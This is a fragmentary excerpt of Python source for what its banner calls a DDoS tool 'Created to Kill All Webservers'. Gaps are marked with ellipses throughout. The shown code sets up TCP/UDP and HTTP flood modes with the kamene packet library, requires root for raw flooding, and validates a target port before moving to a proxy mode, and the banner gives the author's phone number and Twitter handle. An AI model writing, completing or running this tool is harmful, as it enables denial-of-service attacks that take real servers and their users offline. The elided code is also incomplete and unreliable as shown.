...
import logging
logging.getLogger("kamene.runtime").setLevel(logging.ERROR) # C0d3d by HIMAS

if sys.platform.startswith("linux"): # C0d3d by HIMAS
	from kamene.all import * # C0d3d by HIMAS
elif sys.platform.startswith("freebsd"): # C0d3d by HIMAS
	from kamene.all import * # C0d3d by HIMAS
else: # C0d3d by HIMAS
	print ("TCP/UDP FLOOD ARE NOT SUPPORTED UNDER THIS SYSTEM. YOU MUST USE HTTP FLOOD.") # C0d3d by HIMAS
...
MOHAMED HIMAS's DDoS Tool | Contact +94756290006 | Follow Me on Twitter @himas96

	''') # Created to Kill All Webservers. Have a sweet Dream
...
def floodmode():
	...
	if choice1 == "0":
		...
		try:
			if os.getuid() != 0: # C0d3d by HIMAS
				print("You need to run this program as root to use TCP/UDP flooding.") # C0d3d by HIMAS
				exit(0) # C0d3d by HIMAS
			else: # C0d3d by HIMAS
				floodport() # C0d3d by HIMAS
		except:
			pass
	elif choice1 == "2":
		try:
...
def floodport():
	...
	try:
		...
		portlist = range(65535) # C0d3d by HIMAS
		if port in portlist: # C0d3d by HIMAS
			pass # C0d3d by HIMAS
		else: # C0d3d by HIMAS
			print ("You mistyped, try again.")
			floodport() # C0d3d by HIMAS
	except ValueError: # C0d3d by HIMAS
		print ("You mistyped, try again.") # C0d3d by HIMAS
		floodport() # C0d3d by HIMAS
	proxymode()
